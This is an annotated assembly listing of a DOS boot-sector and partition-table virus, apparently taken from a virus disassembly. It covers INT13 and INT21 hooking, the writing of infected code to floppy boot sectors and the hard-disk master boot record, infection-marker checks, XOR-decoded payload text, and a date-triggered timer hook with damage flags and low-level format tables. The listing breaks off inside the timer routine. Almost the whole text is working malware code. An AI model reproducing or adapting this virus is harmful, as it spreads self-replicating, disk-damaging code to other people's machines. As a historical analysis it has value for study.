TOP:063A  BB0011         MOV    BX,1100
TOP:063D  B8FBCD         MOV    AX,CDFB         ; Indentical string:
TOP:0640  BA1372         MOV    DX,7213         ;  FB CD 13 72
TOP:0643  B90002         MOV    CX,0200
TOP:0646  E82DFD         CALL   0376
TOP:0649  59             POP    CX
TOP:064A  7403           JZ     064F            ; If not found
TOP:064C  E99D00         JMP    06EC            ;  jump to original INT13
TOP:064F  53             PUSH   BX
TOP:0650  51             PUSH   CX              ; Search for other identical
TOP:0651  B90001         MOV    CX,0100         ;  string after the previous
TOP:0654  B832E4         MOV    AX,E432         ; Indentical string2:
TOP:0657  BACD16         MOV    DX,16CD         ;  32 E4 CD 16
TOP:065A  E819FD         CALL   0376
TOP:065D  7405           JZ     0664
TOP:065F  59             POP    CX              ; If not found
TOP:0660  5B             POP    BX              ;  jump to original INT13
TOP:0661  E98800         JMP    06EC


                                                ; Save Start & End address
TOP:0664  83EB06       * SUB    BX,0006         ;  of infected code
TOP:0667  2E891E0D01     MOV    CS:[010D],BX    ;  in boot sector
TOP:066C  59             POP    CX
TOP:066D  5B             POP    BX
TOP:066E  83C305         ADD    BX,0005
TOP:0671  2E891E0F01     MOV    CS:[010F],BX
TOP:0676  2E882E9207     MOV    CS:[0792],CH
TOP:067B  51             PUSH   CX
TOP:067C  BE7B07         MOV    SI,077B
TOP:067F  2E8B1E0F01     MOV    BX,CS:[010F]
TOP:0684  B94300         MOV    CX,0043
TOP:0687  0E             PUSH   CS
TOP:0688  1F             POP    DS

TOP:0689  8A04         * MOV    AL,[SI]         ; Copy infected code to
TOP:068B  8807           MOV    [BX],AL         ;  boot sector
TOP:068D  43             INC    BX
TOP:068E  46             INC    SI
TOP:068F  E2F8           LOOP   0689

TOP:0691  C60790       * MOV    [BX],90         ; Fill the unusable area
TOP:0694  43             INC    BX              ;  with NOPs
TOP:0695  2E3B1E0D01     CMP    BX,CS:[010D]
TOP:069A  72F5           JC     0691

                                                ; Write infected boot to disk
TOP:069C  59             POP    CX
TOP:069D  B90300         MOV    CX,0003         ; 3 probe
TOP:06A0  51           * PUSH   CX
TOP:06A1  B90100         MOV    CX,0001
TOP:06A4  BA0000         MOV    DX,0000
TOP:06A7  B80103         MOV    AX,0301         ; Write 1 sector
TOP:06AA  BB0011         MOV    BX,1100
TOP:06AD  0E             PUSH   CS
TOP:06AE  07             POP    ES
TOP:06AF  E8F8FA         CALL   01AA            ; Call INT13
TOP:06B2  720F           JC     06C3            ; Jump, if error
TOP:06B4  59             POP    CX
TOP:06B5  2E803EFD0400   CMP    CS:[04FD],00
TOP:06BB  7503           JNZ    06C0
TOP:06BD  E9AEFE         JMP    056E            ; Jump to return to caller
TOP:06C0  E93CFE       * JMP    04FF            ; If FLAG_4FD!=0
TOP:06C3  59           * POP    CX
TOP:06C4  E2DA           LOOP   06A0
TOP:06C6  EB24           JMP    06EC            ; 3 error
TOP:06C8  90             NOP

TOP:06C9  90           * NOP                    ; Create INT21 vector
TOP:06CA  B080           MOV    AL,80
TOP:06CC  2EA2A201       MOV    CS:[01A2],AL

TOP:06D0  26A18400       MOV    AX,ES:[0084]    ; Save INT 21
TOP:06D4  2EA39901       MOV    CS:[0199],AX
TOP:06D8  26A18600       MOV    AX,ES:[0086]
TOP:06DC  2EA39B01       MOV    CS:[019B],AX
TOP:06E0  B84002         MOV    AX,0240         ; Set INT 21 to TOP:0240
TOP:06E3  26A38400       MOV    ES:[0084],AX
TOP:06E7  268C0E8600     MOV    ES:[0086],CS

TOP:06EC  5E           * POP    SI
TOP:06ED  5F             POP    DI
TOP:06EE  1F             POP    DS
TOP:06EF  07             POP    ES
TOP:06F0  5A             POP    DX
TOP:06F1  59             POP    CX
TOP:06F2  58             POP    AX
TOP:06F3  5B             POP    BX
TOP:06F4  E99CFA         JMP    0193            ; Jump to original INT13

TOP:06F7  0E             PUSH   CS              ; ATTACK rutine
TOP:06F8  1F             POP    DS
TOP:06F9  2EC706720B8070 MOV    CS:[0B72],7080  ; ?

TOP:0700  33C0           XOR    AX,AX           ; Clear FLAGs (1-6)
TOP:0702  56             PUSH   SI
TOP:0703  57             PUSH   DI
TOP:0704  51             PUSH   CX
TOP:0705  FC             CLD
TOP:0706  BFA201         MOV    DI,01A2
TOP:0709  BEA801         MOV    SI,01A8
TOP:070C  AA             STOSB
TOP:070D  3BFE           CMP    DI,SI
TOP:070F  72FB           JC     070C
TOP:0711  59             POP    CX
TOP:0712  5F             POP    DI
TOP:0713  5E             POP    SI

TOP:0714  8EC0           MOV    ES,AX           ; Load 80 to FLAG1
TOP:0716  2EC606A20180   MOV    CS:[01A2],80

TOP:071C  26A14C00       MOV    AX,ES:[004C]    ; Save INT13 vector
TOP:0720  2EA39401       MOV    CS:[0194],AX
TOP:0724  26A14E00       MOV    AX,ES:[004E]
TOP:0728  2EA39601       MOV    CS:[0196],AX

TOP:072C  B8A003         MOV    AX,03A0         ; Set INT13 vector to CS:03A0
TOP:072F  26A34C00       MOV    ES:[004C],AX
TOP:0733  268C0E4E00     MOV    ES:[004E],CS

TOP:0738  B80102         MOV    AX,0201         ; Load a sector from hard disk
TOP:073B  BB0013         MOV    BX,1300         ;  to CS:1300
TOP:073E  0E             PUSH   CS
TOP:073F  07             POP    ES
TOP:0740  BA8001         MOV    DX,0180         ; 1. head , drive number=80
TOP:0743  B90100         MOV    CX,0001         ; 0. track, 1. sector
TOP:0746  CD13           INT    13

TOP:0748  B80000         MOV    AX,0000         ; Restore INT13 vector
TOP:074B  8EC0           MOV    ES,AX
TOP:074D  2EA19401       MOV    AX,CS:[0194]
TOP:0751  26A34C00       MOV    ES:[004C],AX
TOP:0755  2EA19601       MOV    AX,CS:[0196]
TOP:0759  26A34E00       MOV    ES:[004E],AX

TOP:075D  B800F0         MOV    AX,F000         ; Save original reset vector
TOP:0760  8EC0           MOV    ES,AX
TOP:0762  26A0F0FF       MOV    AL,ES:[FFF0]
TOP:0766  3CEA           CMP    AL,EA
TOP:0768  7510           JNZ    077A
TOP:076A  26A1F1FF       MOV    AX,ES:[FFF1]
TOP:076E  2EA32C03       MOV    CS:[032C],AX
TOP:0772  26A1F3FF       MOV    AX,ES:[FFF3]
TOP:0776  2EA32E03       MOV    CS:[032E],AX
TOP:077A  CB             RET    Far             ; Return to caller

;-----------------------------------------------------------------------------
;       The original boot sector's first part as the same
;       It loads at 0:7C00
;
; BOOT:0000  EB34           JMP    0036
; BOOT:0002  90             NOP
;
; BOOT:0003            49 42 4D 20 20 33 2E 32 00 02 02 01 00   .4.IBM  3.2....
; BOOT:0010   02 70 00 D0 02 FD 02 00 09 00 02 00 00 00 00 00   .p.............
; BOOT:0020   00 00 00 00 00 00 00 00 00 00 00
; BOOT:002B                                    00 00 00 00 0F   ...............
; BOOT:0030   00 00 00 00 01 00                                 ......
;
; BOOT:0036  FA           * CLI                   ; Main Entry Point
; BOOT:0037  33C0           XOR    AX,AX
; BOOT:0039  8ED0           MOV    SS,AX
; BOOT:003B  BC007C         MOV    SP,7C00
; BOOT:003E  16             PUSH   SS
; BOOT:003F  07             POP    ES
; BOOT:0040  BB7800         MOV    BX,0078
; BOOT:0043  36C537         LDS    SI,SS:[BX]     ; DS:SI points to
;                                                 ;   Diskette Parameters
; BOOT:0046  1E             PUSH   DS             ; Copy DPT parameters to
; BOOT:0047  56             PUSH   SI             ;  own data area
; BOOT:0048  16             PUSH   SS
; BOOT:0049  53             PUSH   BX
; BOOT:004A  BF2B7C         MOV    DI,7C2B
; BOOT:004D  B90B00         MOV    CX,000B
; BOOT:0050  FC             CLD
; BOOT:0051  AC           * LODSB
; BOOT:0052  26803D00       CMP    ES:[DI],00     ; If own data is zero
; BOOT:0056  7403           JZ     005B
; BOOT:0058  268A05         MOV    AL,ES:[DI]
; BOOT:005B  AA           * STOSB
; BOOT:005C  8AC4           MOV    AL,AH
; BOOT:005E  E2F1           LOOP   0051
;
; BOOT:0060  06             PUSH   ES             ; Change DTP address
; BOOT:0061  1F             POP    DS             ;   ( INT 1E )
; BOOT:0062  894702         MOV    [BX+02],AX
; BOOT:0065  C7072B7C       MOV    [BX],7C2B
;
; BOOT:0069  FB             STI
; BOOT:006A  CD13           INT    13             ; Reset disk
; BOOT:006C  7267           JC     00D5           ;  If error -> jmp error rutine
;
; The virus code loads here


TOP:077B  CD12           INT    12              ; Infection code in boot sector

TOP:077D  BB4000         MOV    BX,0040         ; Start of the virus
TOP:0780  F7E3           MUL    BX              ; Get Unusable memory size
TOP:0782  2D0010         SUB    AX,1000         ;  (same as 0:413)
TOP:0785  8EC0           MOV    ES,AX
TOP:0787  BA0000         MOV    DX,0000         ; Value in pharagraphs
TOP:078A  EB04           JMP    0790            ; "Allocate" memory on TOP
TOP:078C  90             NOP

TOP:078D  17             DB     17              ; Virus Version Information
TOP:078E  0006           DW     0600


TOP:0790  B90128         MOV    CX,2801         ; Set value for loading
                                                ; from 40. track 1. sector
TOP:0793  B80802         MOV    AX,0208         ;  virus code
TOP:0796  BB0001         MOV    BX,0100
TOP:0799  53             PUSH   BX
TOP:079A  26813F5224     CMP    ES:[BX],2452    ; Memory is infected ?
TOP:079F  740B           JZ     07AC
                                                ; No (,not yet)
TOP:07A1  CD13           INT    13              ; Load 8 sectors to TOP:0100
TOP:07A3  5B             POP    BX
TOP:07A4  7218           JC     07BE            ; Jump to the error routine
TOP:07A6  06             PUSH   ES
TOP:07A7  B80201         MOV    AX,0102         ; Jump to TOP:102
TOP:07AA  50           * PUSH   AX
TOP:07AB  CB             RET    Far
                                                ; Memory is infected !
TOP:07AC  BB000F       * MOV    BX,0F00         ; Load original boot sector
TOP:07AF  B001           MOV    AL,01
TOP:07B1  B108           MOV    CL,08
TOP:07B3  CD13           INT    13              ; Load 1 sector to TOP:0F00
TOP:07B5  5B             POP    BX
TOP:07B6  7206           JC     07BE            ; Error ?
TOP:07B8  06             PUSH   ES
TOP:07B9  B80501         MOV    AX,0105         ; Jump to TOP:105
TOP:07BC  EBEC           JMP    07AA

;                      *                        ; From here,
                                                ; this is a part of an original
                                                ; boot sector

;-----------------------------------------------------------------------------

TOP:07BE  90             NOP
TOP:07BF  90             NOP

TOP:07C0  E9B700       * JMP    087A            ; INT 13 and DL=80

TOP:07C3  2EA0A301     * MOV    AL,CS:[01A3]    ; Check FLAG2
TOP:07C7  3C80           CMP    AL,80
TOP:07C9  7403           JZ     07CE
TOP:07CB  E91EFF         JMP    06EC            ; Jump to original INT13

                                                ; Check, if read or write the
                                                ;  1st absolute sector on
                                                ;  hard drive, and repleace it
                                                ;  with the other
TOP:07CE  5E           * POP    SI              ; Save registers
TOP:07CF  5F             POP    DI
TOP:07D0  1F             POP    DS
TOP:07D1  07             POP    ES
TOP:07D2  5A             POP    DX
TOP:07D3  59             POP    CX
TOP:07D4  58             POP    AX
TOP:07D5  5B             POP    BX
TOP:07D6  80FD00         CMP    CH,00           ; Check track number
TOP:07D9  7403           JZ     07DE
TOP:07DB  EB4B           JMP    0828            ; Jump call INT13
TOP:07DD  90             NOP
TOP:07DE  80F90A         CMP    CL,0A           ; Check sector number and
TOP:07E1  7203           JC     07E6            ;  2 bits of track number
TOP:07E3  EB43           JMP    0828            ; Jump call INT13
TOP:07E5  90             NOP
TOP:07E6  80FE00         CMP    DH,00           ; Check head number
TOP:07E9  7403           JZ     07EE
TOP:07EB  EB3B           JMP    0828            ; Jump call INT13
TOP:07ED  90             NOP

TOP:07EE  80FC03         CMP    AH,03           ; Check for writing
TOP:07F1  753B           JNZ    082E

                                                ; Write sector
TOP:07F3  2EC606A30100   MOV    CS:[01A3],00    ; Load 0 to FLAG2

TOP:07F9  50             PUSH   AX              ; Save registers
TOP:07FA  53             PUSH   BX
TOP:07FB  51             PUSH   CX
TOP:07FC  52             PUSH   DX
TOP:07FD  BA8000         MOV    DX,0080         ; Read the original Part. Tabl.
TOP:0800  B80102         MOV    AX,0201
TOP:0803  B90900         MOV    CX,0009
TOP:0806  BB0011         MOV    BX,1100
TOP:0809  06             PUSH   ES
TOP:080A  0E             PUSH   CS
TOP:080B  07             POP    ES
TOP:080C  BA8000         MOV    DX,0080
TOP:080F  E898F9         CALL   01AA            ; Call INT13
TOP:0812  720F           JC     0823

TOP:0814  B80103         MOV    AX,0301         ; Write original Part. Tabl.
TOP:0817  B90100         MOV    CX,0001         ;  to the absolute 1st sector
TOP:081A  BA8000         MOV    DX,0080
TOP:081D  BB0011         MOV    BX,1100
TOP:0820  E887F9         CALL   01AA            ; Call INT13
TOP:0823  07           * POP    ES              ; Restore registers
TOP:0824  5A             POP    DX
TOP:0825  59             POP    CX
TOP:0826  5B             POP    BX
TOP:0827  58             POP    AX

TOP:0828  E87FF9       * CALL   01AA            ; Call INT13
TOP:082B  E94DFC         JMP    047B            ; Jump return to caller

TOP:082E  80FC02         CMP    AH,02
TOP:0831  75F5           JNZ    0828            ; Jump call INT13

TOP:0833  57             PUSH   DI              ; Save registers
TOP:0834  51             PUSH   CX
TOP:0835  52             PUSH   DX
TOP:0836  53             PUSH   BX
TOP:0837  50             PUSH   AX
TOP:0838  50             PUSH   AX

TOP:0839  B400           MOV    AH,00           ; DI = number of sectors
TOP:083B  8BF8           MOV    DI,AX
TOP:083D  58             POP    AX

                                                ; Read sectors step by step
TOP:083E  51           * PUSH   CX
TOP:083F  80F901         CMP    CL,01           ; Check, if the Part. Table
TOP:0842  7505           JNZ    0849
TOP:0844  B109           MOV    CL,09           ; If not Part.Tabl.-> 9.sector.
TOP:0846  EB04           JMP    084C
TOP:0848  90             NOP
TOP:0849  B90A00       * MOV    CX,000A         ; If Part.Table->load 10.sector
TOP:084C  53           * PUSH   BX
TOP:084D  57             PUSH   DI
TOP:084E  B001           MOV    AL,01           ; Load 1 sector
TOP:0850  06             PUSH   ES
TOP:0851  B402           MOV    AH,02           ; Load code
TOP:0853  E854F9         CALL   01AA            ; Call INT13
TOP:0856  07             POP    ES
TOP:0857  5F             POP    DI
TOP:0858  5B             POP    BX
TOP:0859  59             POP    CX
TOP:085A  7214           JC     0870            ; Jump return with error
TOP:085C  81C30002       ADD    BX,0200         ; Increase buffer pointer
TOP:0860  B102           MOV    CL,02
TOP:0862  4F             DEC    DI
TOP:0863  75D9           JNZ    083E            ; Jump to read next sector

TOP:0865  58             POP    AX
TOP:0866  B400           MOV    AH,00           ; Set ERRCODE to no error

TOP:0868  5B             POP    BX              ; Restore registers
TOP:0869  5A             POP    DX
TOP:086A  59             POP    CX
TOP:086B  5F             POP    DI
TOP:086C  F8             CLC                    ; Clear Carry (No error)
TOP:086D  E90BFC         JMP    047B            ; Jump return to caller

TOP:0870  5B           * POP    BX              ; Restore registers
TOP:0871  5B             POP    BX
TOP:0872  5A             POP    DX
TOP:0873  59             POP    CX
TOP:0874  5F             POP    DI
TOP:0875  B000           MOV    AL,00
TOP:0877  E901FC         JMP    047B            ; Jump return to caller

                                                ; INT13 with the 1st hard drive
TOP:087A  2EA0A301     * MOV    AL,CS:[01A3]    ; Check FLAG2
TOP:087E  3C80           CMP    AL,80
TOP:0880  7503           JNZ    0885
TOP:0882  E93EFF         JMP    07C3            ; jump next if FLAG2 = 40 or 80
TOP:0885  3C40         * CMP    AL,40
TOP:0887  7503           JNZ    088C
TOP:0889  E937FF         JMP    07C3

                                                ; Read the Part.Table of
                                                ;  1. hard disk
TOP:088C  B90300       * MOV    CX,0003         ; 3 probe
TOP:088F  51             PUSH   CX
TOP:0890  BA8000         MOV    DX,0080
TOP:0893  B90100         MOV    CX,0001
TOP:0896  BB000F         MOV    BX,0F00         ; Address of buffer: CS:0F00
TOP:0899  B80102         MOV    AX,0201
TOP:089C  0E             PUSH   CS
TOP:089D  07             POP    ES
TOP:089E  E809F9         CALL   01AA            ; Call INT13
TOP:08A1  59             POP    CX
TOP:08A2  7305           JNC    08A9
TOP:08A4  E2E9           LOOP   088F
TOP:08A6  E91AFF       * JMP    07C3            ; If error jump next

                                                ; Read the boot sector of
                                                ;  1. partition on 1. hard disk
TOP:08A9  BA8001       * MOV    DX,0180
TOP:08AC  B90100         MOV    CX,0001
TOP:08AF  BB0011         MOV    BX,1100         ; Address of buffer: CS:1100
TOP:08B2  B80102         MOV    AX,0201
TOP:08B5  0E             PUSH   CS
TOP:08B6  07             POP    ES
TOP:08B7  E8F0F8         CALL   01AA            ; Call INT13
TOP:08BA  72EA           JC     08A6            ; If error jump next

TOP:08BC  BB0011         MOV    BX,1100         ; Check, if boot sector is
TOP:08BF  2E8B87FE01     MOV    AX,CS:[BX+01FE] ; a valid boot sector
TOP:08C4  3D55AA         CMP    AX,AA55
TOP:08C7  7408           JZ     08D1

TOP:08C9  2EC606A30140   MOV    CS:[01A3],40    ; If not, load 40 to FLAG2
TOP:08CF  EBD5           JMP    08A6            ; Jump next


TOP:08D1  0E           * PUSH   CS              ; Check, if Partition Table
TOP:08D2  1F             POP    DS              ;  is infected
TOP:08D3  B90300         MOV    CX,0003         ; Check 1st 3 bytes
TOP:08D6  BB000F         MOV    BX,0F00
TOP:08D9  BE4509         MOV    SI,0945
TOP:08DC  8A07         * MOV    AL,[BX]
TOP:08DE  3A04           CMP    AL,[SI]
TOP:08E0  7529           JNZ    090B
TOP:08E2  43             INC    BX
TOP:08E3  46             INC    SI
TOP:08E4  E2F6           LOOP   08DC

TOP:08E6  83EB03         SUB    BX,0003         ; Check version information
TOP:08E9  81C31100       ADD    BX,0011
TOP:08ED  8A07           MOV    AL,[BX]         ; Check the 1st byte
TOP:08EF  3C17           CMP    AL,17
TOP:08F1  7509           JNZ    08FC


                                                ; Check the word
TOP:08F3  8B841100       MOV    AX,[SI+0011]    ; This a fault: [SI+000F]
TOP:08F7  3B4701         CMP    AX,[BX+01]      ;  is correct, but if there is
TOP:08FA  7206           JC     0902            ;  only one version, that
                                                ;  no problem

TOP:08FC  B80703       * MOV    AX,0307         ; If the 1st byte != 17
TOP:08FF  EB0D           JMP    090E            ;  or the word smaller or equal
TOP:0901  90             NOP                    ; It's correct to write only
                                                ;  seven sectors

TOP:0902  2EC606A30180 * MOV    CS:[01A3],80    ; The har disk's already
TOP:0908  E9B8FE         JMP    07C3            ;  infected & that version
                                                ;  is grater than this
                                                ; Nothing to do ! Jump next


TOP:090B  B80803       * MOV    AX,0308         ; Hard disk is not infected
                                                ;  It's to write 8 sectors

TOP:090E  BA8000       * MOV    DX,0080         ; Write 7 or 8 sectors
TOP:0911  B90200         MOV    CX,0002         ; From the 2nd sector
TOP:0914  BB0001         MOV    BX,0100
TOP:0917  E890F8         CALL   01AA            ; Call INT13
TOP:091A  7303           JNC    091F
TOP:091C  E9A4FE         JMP    07C3            ; If error, jump next

TOP:091F  BE4509       * MOV    SI,0945         ; Copy infection code onto
TOP:0922  B94C00         MOV    CX,004C         ;  the buffer of
TOP:0925  BF000F         MOV    DI,0F00         ;  Partition Table
TOP:0928  9C             PUSHF
TOP:0929  FC             CLD
TOP:092A  F3A4           REP    MOVSB
TOP:092C  9D             POPF

TOP:092D  B80103         MOV    AX,0301         ; Write infected
TOP:0930  BA8000         MOV    DX,0080         ;  Partition Table to disk
TOP:0933  B90100         MOV    CX,0001
TOP:0936  BB000F         MOV    BX,0F00
TOP:0939  E86EF8         CALL   01AA
TOP:093C  2EC606A30180   MOV    CS:[01A3],80    ; Load 80 to FLAG2
TOP:0942  E97EFE         JMP    07C3            ; Jump next

;----------------------------------------------------------------------------

                                                ; Infection code in the
                                                ;  Partition Table
TOP:0945  CD12           INT    12              ; Get Unusable Memory Size
                                                ; (same as 0:413)

TOP:0947  BB4000         MOV    BX,0040         ; Value in pharagraphs
TOP:094A  F7E3           MUL    BX              ; Allocate memory on TOP
TOP:094C  2D0010         SUB    AX,1000         ; one segment ! (64Kbyte)
TOP:094F  8EC0           MOV    ES,AX
TOP:0951  33C0           XOR    AX,AX           ; Zero AX
TOP:0953  EB04           JMP    0959
TOP:0955  90             NOP

TOP:0956  17             DB     17              ; Virus Version Information
TOP:0957  0006           DW     0600

TOP:0959  8ED0         * MOV    SS,AX           ; Set SS:SP to 0:7C00
TOP:095B  BC007C         MOV    SP,7C00

TOP:095E  BA8000         MOV    DX,0080         ; Set registers for loading
TOP:0961  B90200         MOV    CX,0002         ; Virus Code Areas
TOP:0964  B80802         MOV    AX,0208         ; 8 sectors from the 2. to
TOP:0967  BB0001         MOV    BX,0100         ; TOP:100
TOP:096A  53             PUSH   BX              ; Save BX
TOP:096B  26813F5224     CMP    ES:[BX],2452    ; Memory is infected ?
TOP:0970  740B           JZ     097D
                                                ; Memory Isn't infected !
TOP:0972  CD13           INT    13              ; Load Virus Code: 8 sectors
TOP:0974  5B             POP    BX              ; Restore BX
TOP:0975  7218           JC     098F            ; If there was an Error
TOP:0977  06             PUSH   ES
TOP:0978  B80201         MOV    AX,0102         ; Jump to the 2. byte of VirCode
TOP:097B  50           * PUSH   AX
TOP:097C  CB             RET    Far

TOP:097D  BB000F       * MOV    BX,0F00         ; Yes, memory is infected !
TOP:0980  B001           MOV    AL,01           ; 1 sector
TOP:0982  B109           MOV    CL,09           ; from the 9.
TOP:0984  CD13           INT    13              ; Load the original Part.Table
TOP:0986  5B             POP    BX              ; Restore BX
TOP:0987  7206           JC     098F            ; If there was an Error
TOP:0989  06             PUSH   ES
TOP:098A  B80501         MOV    AX,0105         ; Jump to the 5. byte of VirCode
TOP:098D  EBEC           JMP    097B
TOP:098F  EBFE         * JMP    098F            ; If there was an Error

;----------------------------------------------------------------------------

TOP:0991  90             NOP
TOP:0992  90             NOP

TOP:0993  6911           DW     1169            ; The place,where the indentical
                                                ;  string found in boot sector


TOP:0995  FB             STI                    ; A part of a correct boot
TOP:0996  CD13           INT    13              ;  sector
TOP:0998  7267           JC     0A01            ; The 1st four byte is the
TOP:099A  A0107C         MOV    AL,[7C10]       ;  indentical string
TOP:099D  98             CBW
TOP:099E  F726167C       MUL    W/[7C16]
TOP:09A2  03061C7C       ADD    AX,[7C1C]
TOP:09A6  03060E7C       ADD    AX,[7C0E]
TOP:09AA  A33F7C         MOV    [7C3F],AX
TOP:09AD  A3377C         MOV    [7C37],AX
TOP:09B0  B82000         MOV    AX,0020
TOP:09B3  F726117C       MUL    W/[7C11]
TOP:09B7  8B1E0B7C       MOV    BX,[7C0B]
TOP:09BB  03C3           ADD    AX,BX
TOP:09BD  48             DEC    AX
TOP:09BE  F7F3           DIV    BX
TOP:09C0  0106377C       ADD    [7C37],AX
TOP:09C4  BB0005         MOV    BX,0500
TOP:09C7  A13F7C         MOV    AX,[7C3F]
TOP:09CA  E89F00         CALL   0A6C
TOP:09CD  B80102         MOV    AX,0201
TOP:09D0  E8B300         CALL   0A86
TOP:09D3  7219           JC     09EE
TOP:09D5  8BFB           MOV    DI,BX
TOP:09D7  B90B00         MOV    CX,000B
TOP:09DA  BED67D         MOV    SI,7DD6
TOP:09DD  F3A6           REP    CMPSB
TOP:09DF  750D           JNZ    09EE
TOP:09E1  8D7F20         LEA    DI,[BX+20]
TOP:09E4  BE1E7D         MOV    SI,7D1E
TOP:09E7  B90B00         MOV    CX,000B
TOP:09EA  F3A4           REP    MOVSB
TOP:09EC  7418           JZ     0A06            ; End of the original boot

TOP:09EE  0000           DW     0
TOP:09F0  0000           DW     0
TOP:09F2  0000           DW     0
TOP:09F4  0000           DW     0
TOP:09F6  0000           DW     0
TOP:09F8  0000           DW     0


TOP:09FA  DF 02 25 02 0F                ; Disk Parameter Table
          1B FF 54 F6 0F
          08

          4F 00 04                      ; +3 byte


TOP:0A08  D1 02 25 02 09                ; Disk Parameter Table
          2A FF 50 F6 0F
          04

          4F 80 05                      ; +3 byte


TOP:0A16  DF 02 25 02 09                ; Disk Parameter Table
          23 FF 50 F6 0F
          08

          27 28 03                      ; +3 byte


TOP:0A24  A1 02 25 02 12                ; Disk Parameter Table
          1B FF 60 F6 0F
          04

          4F 00 07                      ; +3 byte


TOP:0A32  2205           DW     0522            ; Address of Disk Parameter
TOP:0A34  0000           DW     0               ;  Table (saved)



TOP:0A36  0000           DW     0
TOP:0A38  0000           DW     0
TOP:0A3A  0000           DW     0
TOP:0A3C  0000           DW     0
TOP:0A3E  0000           DW     0
TOP:0A40  0000           DW     0

TOP:0A42  50 00 01 02                   ; Sector descriptor for low-level
          50 00 02 02                   ;  format
          50 00 03 02
          50 00 04 02                   ; Track,Head,Sector,SizeCode
          50 00 05 02                   ;  Sizecode = 2  -> Size = 512 bytes
          50 00 06 02
          50 00 07 02
          50 00 08 02
          50 00 09 02
          50 00 0A 02
          50 00 0B 02
          50 00 0C 02
          50 00 0D 02
          50 00 0E 02
          50 00 0F 02
          50 00 10 02
          50 00 11 02
          50 00 11 02
          50 00 12 02

TOP:0A8E  28 00 01 02                   ; Sector descriptor for low-level
          28 00 02 02                   ;  format
          28 00 03 02
          28 00 04 02                   ; Track,Head,Sector,SizeCode
          28 00 05 02                   ;  Sizecode = 2  -> Size = 512 bytes
          28 00 06 02
          28 00 07 02
          28 00 08 02
          28 00 09 02


TOP:0AB2  00             DB     0               ; Demage flag 1 (DMF1)
TOP:0AB3  00             DB     0               ; Demage flag 2 (DMF2)

TOP:0AB4  50             PUSH   AX              ; Save registers
TOP:0AB5  53             PUSH   BX
TOP:0AB6  51             PUSH   CX
TOP:0AB7  52             PUSH   DX
TOP:0AB8  06             PUSH   ES
TOP:0AB9  1E             PUSH   DS
TOP:0ABA  57             PUSH   DI
TOP:0ABB  56             PUSH   SI

TOP:0ABC  B80102         MOV    AX,0201         ; Load a sector from
TOP:0ABF  B90A00         MOV    CX,000A         ;  Cyl=0, Hd=0, Sec=0A
TOP:0AC2  BB000F         MOV    BX,0F00         ;  to CS:0F00
TOP:0AC5  BA8000         MOV    DX,0080
TOP:0AC8  0E             PUSH   CS
TOP:0AC9  07             POP    ES
TOP:0ACA  9C             PUSHF
TOP:0ACB  0E             PUSH   CS
TOP:0ACC  E8C4F6         CALL   0193            ; Call original INT13

TOP:0ACF  2E8E06680B     MOV    ES,CS:[0B68]    ; Load segment of this code
TOP:0AD4  26C706B20A0000 MOV    ES:[0AB2],0000  ; Clear DMF1
TOP:0ADB  7210           JC     0AED
TOP:0ADD  2EA1000F       MOV    AX,CS:[0F00]    ; Check that sector
TOP:0AE1  3C23           CMP    AL,23
TOP:0AE3  7508           JNZ    0AED            ; If the 1st byte == 0x23
TOP:0AE5  268826B20A     MOV    ES:[0AB2],AH    ; Set DMF1 to the 2nd byte
TOP:0AEA  EB01           JMP    0AED
TOP:0AEC  90             NOP

                                                ; Decode data (text & figure)
TOP:0AED  2E8E06680B   * MOV    ES,CS:[0B68]    ; Load segment of this code
TOP:0AF2  BB470C         MOV    BX,0C47
TOP:0AF5  B96801         MOV    CX,0168
TOP:0AF8  268A07         MOV    AL,ES:[BX]
TOP:0AFB  3C20           CMP    AL,20           ; If already decoded
TOP:0AFD  750B           JNZ    0B0A
TOP:0AFF  268A07         MOV    AL,ES:[BX]
TOP:0B02  3445           XOR    AL,45
TOP:0B04  268807         MOV    ES:[BX],AL
TOP:0B07  43             INC    BX
TOP:0B08  E2F5           LOOP   0AFF

TOP:0B0A  B525           MOV    CH,25           ; Load CMOS date, if possible
TOP:0B0C  B404           MOV    AH,04
TOP:0B0E  CD1A           INT    1A
TOP:0B10  7212           JC     0B24
TOP:0B12  80F989         CMP    CL,89
TOP:0B15  720D           JC     0B24
TOP:0B17  80FD25         CMP    CH,25
TOP:0B1A  7413           JZ     0B2F
TOP:0B1C  80FE07         CMP    DH,07
TOP:0B1F  730E           JNC    0B2F
TOP:0B21  EB3C           JMP    0B5F
TOP:0B23  90             NOP

TOP:0B24  B054           MOV    AL,54           ; If error  or  year < 89
TOP:0B26  E643           OUT    [43],AL
TOP:0B28  B0FF           MOV    AL,FF
TOP:0B2A  E641           OUT    [41],AL
TOP:0B2C  EB31           JMP    0B5F
TOP:0B2E  90             NOP
                                                ; If XT  or  month >= 7
TOP:0B2F  26803EB20A02   CMP    ES:[0AB2],02    ; Check DMF1
TOP:0B35  7428           JZ     0B5F

TOP:0B37  B80000         MOV    AX,0000         ; Save INT 1C vector
TOP:0B3A  2E8E1E680B     MOV    DS,CS:[0B68]    ; Load segment of this code
TOP:0B3F  8EC0           MOV    ES,AX
TOP:0B41  26A17000       MOV    AX,ES:[0070]
TOP:0B45  A36D0B         MOV    [0B6D],AX
TOP:0B48  26A17200       MOV    AX,ES:[0072]
TOP:0B4C  A36F0B         MOV    [0B6F],AX

TOP:0B4F  B8740B         MOV    AX,0B74         ; Set INT 1C vector to CS:0B74
TOP:0B52  26A37000       MOV    ES:[0070],AX
TOP:0B56  2EA1680B       MOV    AX,CS:[0B68]
TOP:0B5A  268C1E7200     MOV    ES:[0072],DS

TOP:0B5F  5E           * POP    SI
TOP:0B60  5F             POP    DI
TOP:0B61  1F             POP    DS
TOP:0B62  07             POP    ES
TOP:0B63  5A             POP    DX
TOP:0B64  59             POP    CX
TOP:0B65  5B             POP    BX
TOP:0B66  58             POP    AX
TOP:0B67  C3             RET

TOP:0B68  6310           DW     1063            ; segment of this code
TOP:0B6A  0000           DW     0

TOP:0B6C  EA53FF00F0     JMP    F000:FF53       ; Original vector of INT 1C

TOP:0B71  00             DB     0
TOP:0B72  A55E           DW     7080            ; number of 18.2 ticks (26 min)


                                                ; INT 1C Entry Point
TOP:0B74  9C             PUSHF                  ; Save registers
TOP:0B75  50             PUSH   AX
TOP:0B76  53             PUSH   BX
TOP:0B77  51             PUSH   CX
TOP:0B78  52             PUSH   DX
TOP:0B79  1E             PUSH   DS
TOP:0B7A  0E             PUSH   CS
TOP:0B7B  1F             POP    DS
TOP:0B7C  B90200         MOV    CX,0002
TOP:0B7F  BBC203         MOV    BX,03C2
TOP:0B82  2E8A07         MOV    AL,CS:[BX]
TOP:0B85  3C90           CMP    AL,90
